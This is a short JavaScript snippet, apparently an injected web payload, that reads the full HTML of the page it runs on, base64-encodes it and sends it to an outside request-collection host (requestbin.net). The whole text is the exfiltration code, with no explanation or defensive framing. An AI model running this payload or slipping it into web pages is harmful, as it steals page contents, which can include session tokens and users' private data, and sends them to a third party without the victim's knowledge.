xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", document.location, false);
xmlHttp.send( null );
ret=xmlHttp.responseText;
var x = new XMLHttpRequest();
x.open("GET", "http://requestbin.net/r/14asih01?inspect="+btoa(ret), false);
x.send();
